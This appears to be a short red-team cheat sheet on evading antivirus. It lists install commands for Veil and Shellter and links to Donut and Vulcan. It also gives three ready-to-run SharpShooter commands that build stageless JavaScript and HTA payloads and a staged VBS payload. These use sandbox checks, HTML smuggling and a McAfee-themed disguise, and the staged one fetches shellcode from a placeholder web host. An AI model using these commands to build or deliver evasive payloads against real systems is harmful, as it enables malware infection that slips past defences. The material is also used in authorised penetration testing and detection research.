# Bypassing AV

### Veil Framework <a id="veil-framework"></a>

Install on Kali:

```text
apt install veil
/usr/share/veil/config/setup.sh --force --silent
```

Reference: [https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)

### Shellter <a id="shellter"></a>

Source: [https://www.shellterproject.com/download/](https://www.shellterproject.com/download/)

```text
apt install shellter
```

### Sharpshooter <a id="sharpshooter"></a>

Javascript Payload Stageless:

```text
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
```

Stageless HTA Payload:

```text
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
```

Staged VBS:

```text
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

Reference: [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

### Donut: <a id="donut"></a>

Source: [https://github.com/TheWover/donut](https://github.com/TheWover/donut)

### Vulcan <a id="vulcan"></a>

Source: [https://github.com/praetorian-code/vulcan](https://github.com/praetorian-code/vulcan)

